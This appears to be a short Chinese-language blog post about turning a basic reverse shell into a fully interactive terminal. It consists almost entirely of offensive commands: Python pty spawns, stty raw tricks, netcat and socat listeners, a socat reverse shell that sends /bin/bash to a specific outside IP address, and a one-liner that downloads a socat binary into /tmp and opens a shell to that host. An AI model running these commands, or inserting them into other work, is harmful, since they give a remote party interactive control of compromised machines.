---
title: 提升为完全交互式的shell
date: 2024-01-12 21:28:52
tags:
---
## 有python

## Python

提升为完全交互式终端

```python
#检测python版本
which python python2 python3

# 提升为半交互式终端
python -c 'import pty;pty.spawn("/bin/bash")' && export SHELL=bash && export TERM=xterm-256color

# python3/python2
python3 -c 'import pty;pty.spawn("/bin/bash")' && export SHELL=bash && export TERM=xterm-256color

python2 -c 'import pty;pty.spawn("/bin/bash")' && export SHELL=sh && export TERM=xterm-256color
 ​  
# 将shell发送到后台  
Ctrl+Z

# 设置 shell 以通过反向 shell 发送控制字符和其他原始输入, 最终为完全交互式. 
stty raw -echo;fg
 ​  
# 上面两步可以直接用下方监听代替(解决键盘输入，如上下左右等)
rlwrap nc -lvnp 8888
```

## 无python(Socat)

Socat交互式：

监听
```
socat file:`tty`,raw,echo=0 tcp-listen:8888
nc -lvvp 8888也可以，但是只能半交互式
```

反弹
```
socat TCP:139.159.221.73:8888 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

一键反弹（远程下载socat,要求能访问github,或者自行python开启http）
```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:139.159.221.73:8888
```

